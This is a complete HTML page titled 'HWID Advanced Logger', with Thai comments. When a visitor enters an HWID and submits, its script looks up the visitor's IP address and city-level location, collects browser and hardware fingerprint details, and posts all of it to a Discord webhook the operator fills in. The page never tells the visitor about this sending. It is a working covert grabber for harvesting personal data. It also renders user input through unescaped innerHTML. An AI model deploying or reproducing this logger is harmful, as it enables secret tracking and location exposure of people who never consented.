<!DOCTYPE html>
<html>
<head>
  <title>HWID Advanced Logger</title>
  <style>
    body {
      font-family: Arial;
      background: #0f172a;
      color: white;
      text-align: center;
      padding: 50px;
    }
    input {
      padding: 12px;
      width: 350px;
      border-radius: 10px;
      border: none;
    }
    button {
      padding: 12px 20px;
      margin-left: 10px;
      border-radius: 10px;
      border: none;
      cursor: pointer;
      background: #22c55e;
      color: white;
      font-weight: bold;
    }
    .card {
      margin-top: 20px;
      background: #1e293b;
      padding: 20px;
      border-radius: 15px;
      text-align: left;
      display: inline-block;
    }
  </style>
</head>
<body>

<h1>🧠 Advanced HWID Logger</h1>

<input id="hwid" placeholder="Enter HWID..." />
<button onclick="run()">Submit</button>

<div id="result"></div>

<script>
async function getIP() {
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    return data.ip;
  } catch {
    return "unknown";
  }
}

async function getGeo(ip) {
  try {
    const res = await fetch(`https://ipapi.co/${ip}/json/`);
    return await res.json();
  } catch {
    return {};
  }
}

async function run() {
  const hwid = document.getElementById("hwid").value.trim();

  if (!hwid) {
    document.getElementById("result").innerText = "❌ ใส่ HWID ก่อน";
    return;
  }

  const ip = await getIP();
  const geo = await getGeo(ip);

  const data = {
    hwid: hwid,
    ip: ip,
    country: geo.country_name || "unknown",
    city: geo.city || "unknown",
    org: geo.org || "unknown",
    timezone: geo.timezone || "unknown",
    browser: navigator.userAgent,
    os: navigator.platform,
    language: navigator.language,
    screen: screen.width + "x" + screen.height,
    cores: navigator.hardwareConcurrency || "unknown",
    memory: navigator.deviceMemory || "unknown",
    time: new Date().toLocaleString()
  };

  // 🔥 แสดงหน้าเว็บ
  document.getElementById("result").innerHTML = `
    <div class="card">
      <p><b>HWID:</b> ${data.hwid}</p>
      <p><b>IP:</b> ${data.ip}</p>
      <p><b>Country:</b> ${data.country}</p>
      <p><b>City:</b> ${data.city}</p>
      <p><b>ISP:</b> ${data.org}</p>
      <p><b>Timezone:</b> ${data.timezone}</p>
      <hr>
      <p><b>OS:</b> ${data.os}</p>
      <p><b>Browser:</b> ${data.browser}</p>
      <p><b>Language:</b> ${data.language}</p>
      <p><b>Screen:</b> ${data.screen}</p>
      <p><b>CPU Cores:</b> ${data.cores}</p>
      <p><b>RAM (approx):</b> ${data.memory} GB</p>
      <hr>
      <p><b>Time:</b> ${data.time}</p>
    </div>
  `;

  // 🔥 ส่งเข้า Discord
  const webhook = "ใส่ webhook ของคุณ";

  await fetch(webhook, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      embeds: [{
        title: "🧠 USER FULL DATA",
        color: 0x00ffcc,
        fields: Object.entries(data).map(([k,v]) => ({
          name: k.toUpperCase(),
          value: String(v)
        })),
        timestamp: new Date()
      }]
    })
  });
}
</script>

</body>
</html>
